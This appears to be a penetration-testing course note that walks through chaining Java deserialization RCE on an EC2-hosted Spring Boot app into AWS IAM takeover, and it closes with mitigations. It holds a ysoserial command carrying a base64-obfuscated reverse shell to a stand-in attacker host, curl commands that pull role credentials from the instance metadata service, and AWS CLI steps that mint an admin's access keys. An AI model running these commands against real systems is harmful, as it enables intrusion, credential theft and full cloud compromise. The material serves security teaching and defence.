---
tags: [chaining, advanced, real-world, vapt]
difficulty: expert
module: "60 - Advanced Chaining and Real-World Scenarios"
topic: "60.14 Chain Deserialization to IAM Takeover"
---

# Advanced Chaining: Insecure Deserialization to Cloud IAM Takeover

## Introduction

Insecure Deserialization is one of the most complex and lethal vulnerabilities in application security, frequently leading to pre-authentication Remote Code Execution (RCE). However, compromising the application server is often just the beginning. 

In modern cloud-native architectures (AWS, GCP, Azure), the application server operates within a highly integrated environment heavily reliant on Identity and Access Management (IAM) roles. This document explores a sophisticated attack chain where an attacker exploits a Java deserialization vulnerability to gain initial access, queries the cloud Instance Metadata Service (IMDS) to steal temporary credentials, and subsequently abuses IAM misconfigurations to escalate privileges and completely take over the cloud environment.

This chain illustrates the critical overlap between Application Security and Cloud Infrastructure Security.

---

## The Attack Kill-Chain Architecture

The following ASCII diagram maps the progression from external web exploitation to complete cloud infrastructure dominance.

```text
+-----------------------+
|       Attacker        |
+-----------+-----------+
            | 1. Discovers Java Serialized Object (rO0AB) in Cookie
            | 2. Crafts `ysoserial` Payload (CommonsCollections)
            v
+-----------------------+       3. Deserializes Payload
|   Cloud Web Server    |  <------------------------------------+
| (Spring Boot / Java)  |   4. RCE Execution (Reverse Shell)    |
+-----------+-----------+                                       |
            |                                                   |
            | 5. Exploit Cloud Environment                      |
            v                                                   |
+-----------------------+                                       |
|  AWS Instance Metadata| (IMDS - 169.254.169.254)              |
|      Service          |                                       |
+-----------+-----------+                                       |
            | 6. Extract EC2 IAM Role Credentials               |
            |    (AccessKeyId, SecretAccessKey, SessionToken)   |
            v                                                   |
+-----------------------+                                       |
| Attacker Local Machine|  <------------------------------------+
| (Configures AWS CLI)  |  7. Authenticates as EC2 Role
+-----------+-----------+
            | 8. Enumerate IAM Permissions (aws iam get-user)
            | 9. Discover Privilege Escalation Vector
            v
+-----------------------+
|    AWS IAM Service    |
| (Misconfigured Policy)|
+-----------+-----------+
            | 10. Execute `iam:PutUserPolicy` or `iam:CreateAccessKey`
            v
+-----------------------+
| Persistent Admin User |
| (Cloud Environment    |
|  Compromised)         |
+-----------------------+
```

---

## Phase 1: Identifying Insecure Deserialization

The target is a legacy Spring Boot Java application hosted on an AWS EC2 instance. 

### 1.1 Discovery
While proxying traffic through Burp Suite, the attacker observes a custom cookie named `UserSession`. The value is a long, base64-encoded string.

```http
Cookie: UserSession=rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUQA...
```

Decoding the base64 string reveals non-printable characters, but crucially, it begins with the hex magic bytes `AC ED 00 05` (which translates to the ASCII string `rO0AB` when base64 encoded). This is the definitive signature of a Java serialized object.

### 1.2 Vulnerability Confirmation
The application is taking the `UserSession` cookie and deserializing it to reconstruct a Java object on the server to manage session state. Because this process happens *before* the application verifies the integrity or authenticity of the object, it is vulnerable to Insecure Deserialization.

---

## Phase 2: Exploitation via ysoserial

To exploit this, the attacker must find a "Gadget Chain"—a sequence of classes available on the application's classpath that, when deserialized, will inadvertently execute arbitrary code.

### 2.1 Generating the Payload
The attacker uses `ysoserial`, the industry-standard tool for exploiting Java deserialization. Knowing the application is an older Spring Boot app, they try the `CommonsCollections` gadget chains.

The payload is designed to execute a reverse shell command:

```bash
# Generating the serialized payload with ysoserial
java -jar ysoserial.jar CommonsCollections4 'bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC9hdHRhY2tlci5jb20vNDQ0NCAwPiYx}|{base64,-d}|{bash,-i}' > payload.bin

# Base64 encoding the payload for the cookie
cat payload.bin | base64 -w 0
```

### 2.2 Achieving RCE
The attacker intercepts a request in Burp Suite, replaces the `UserSession` cookie with their generated base64 payload, and sends the request.

As the Java server attempts to deserialize the object, the `CommonsCollections` gadget chain triggers, executing the injected bash command. The attacker receives a reverse shell on their netcat listener.

```bash
nc -lvnp 4444
# Connection received from 10.0.1.55 (EC2 Internal IP)
# whoami
# app-user
```

---

## Phase 3: Cloud Infrastructure Reconnaissance

Having compromised the EC2 instance, the attacker immediately pivots to assessing their cloud environment.

### 3.1 Accessing the Instance Metadata Service (IMDS)
Every EC2 instance has access to a local, unroutable IP address (`169.254.169.254`) that provides metadata about the instance, including its IAM role credentials.

The attacker attempts to query the IMDSv1 service:

```bash
# Querying the attached IAM Role name
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
> web-app-backend-role

# Extracting the temporary credentials for that role
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/web-app-backend-role
```

The response is a JSON object containing the `AccessKeyId`, `SecretAccessKey`, and `Token`.

```json
{
  "Code" : "Success",
  "Type" : "AWS-HMAC",
  "AccessKeyId" : "ASIAXXXX...",
  "SecretAccessKey" : "YYYYYYYY...",
  "Token" : "IQoJb3JpZ2luX2VjEGI...",
  "Expiration" : "2026-06-10T12:00:00Z"
}
```

### 3.2 Configuring Local Access
The attacker copies these credentials and configures their local AWS CLI to authenticate as the compromised EC2 role. This allows them to use powerful AWS tools directly from their machine without relying on the unstable reverse shell.

```bash
export AWS_ACCESS_KEY_ID="ASIAXXXX..."
export AWS_SECRET_ACCESS_KEY="YYYYYYYY..."
export AWS_SESSION_TOKEN="IQoJb3JpZ2lu..."
```

---

## Phase 4: IAM Privilege Escalation

The attacker is now authenticated as `web-app-backend-role`. They must determine what this role is allowed to do.

### 4.1 Enumerating Permissions
Using tools like `Pacu` or manual AWS CLI commands, the attacker enumerates their permissions.

```bash
# Checking who we are
aws sts get-caller-identity

# Attempting to list attached policies (if permissions allow)
aws iam list-attached-role-policies --role-name web-app-backend-role
```

### 4.2 Discovering the Escalation Vector
The attacker discovers that the role has an overly permissive policy attached. Developers often grant excessive permissions to simplify deployment. In this case, the role has `iam:CreateAccessKey` and `iam:AttachUserPolicy` permissions on a specific group of administrative users.

This is a critical misconfiguration. The ability to manipulate IAM is the keys to the kingdom.

### 4.3 Executing the Escalation
The attacker identifies an existing administrative user named `devops-admin` and generates a new set of permanent access keys for that user.

```bash
# Creating a new access key for the admin user
aws iam create-access-key --user-name devops-admin
```

The AWS API returns a new permanent `AccessKeyId` and `SecretAccessKey`. The attacker configures these new credentials. Because these are permanent user keys, they do not require a Session Token and will not expire.

The attacker now possesses full `AdministratorAccess` to the entire AWS account. They have successfully escalated from a localized application vulnerability to total cloud infrastructure takeover.

---

## Impact and Business Risk

The consequences of this chain are apocalyptic for a cloud-native organization:
1. **Total Infrastructure Control:** The attacker can spin up crypto-mining clusters, delete backups, or destroy entire VPCs.
2. **Data Compromise:** They can access all S3 buckets, RDS databases, and DynamoDB tables across the account.
3. **Persistence:** By creating hidden IAM users or modifying backend Lambda functions, the attacker establishes deep persistence that is incredibly difficult to eradicate.
4. **Supply Chain:** If the AWS account holds CI/CD pipelines (CodeBuild) or container registries (ECR), the attacker can poison software updates sent to customers.

---

## Mitigation and Defense in Depth

This chain exploits weaknesses in both application code and cloud architecture.

### 1. Application Security (Deserialization)
- **Avoid Deserialization:** The best defense is to avoid using native language deserialization formats (like Java serialization, Python Pickle, or PHP serialize). Use safe, text-based formats like JSON or Protocol Buffers.
- **Implement Integrity Checks:** If deserialization is unavoidable, implement HMAC signatures. The application should sign the serialized object before sending it to the client and verify the signature before deserializing it.
- **Look-Ahead Deserialization:** In Java, implement custom `ObjectInputStream` classes that restrict the classes allowed to be deserialized to a strict whitelist.

### 2. Cloud Security (IMDS and IAM)
- **Enforce IMDSv2:** The most critical cloud mitigation is enforcing IMDSv2 on all EC2 instances. IMDSv2 requires a `PUT` request to establish a session token before querying metadata, which effectively neutralizes SSRF and simple reverse-shell `curl` requests.
  ```bash
  aws ec2 modify-instance-metadata-options --instance-id i-12345 --http-tokens required
  ```
- **Principle of Least Privilege:** EC2 roles should *never* have IAM manipulation permissions (`iam:*`). The EC2 instance should only have access to the specific S3 buckets or DynamoDB tables it explicitly requires.
- **Monitor and Alert:** Implement CloudTrail monitoring and GuardDuty to alert on anomalous behavior, such as EC2 temporary credentials being used from outside the AWS IP space (a clear indicator that the credentials were stolen and exported).

---

## Chaining Opportunities

- **Cross-Account Pivoting:** If the compromised AWS account is part of an AWS Organization and the `devops-admin` role has `sts:AssumeRole` permissions into other accounts (e.g., the Production account), the attacker can pivot across the entire organizational boundary.
- **Serverless Exploitation:** If the target was an AWS Lambda function rather than an EC2 instance, the attacker could exploit the same deserialization flaw, dump the Lambda environment variables (which often contain database passwords and API keys), and escalate similarly.

## Related Notes
- [[13 - Insecure Deserialization]]
- [[19 - Cloud Security Posture Management (CSPM)]]
- [[21 - AWS Pentesting and IAM Privilege Escalation]]
- [[31 - Server-Side Vulnerabilities]]
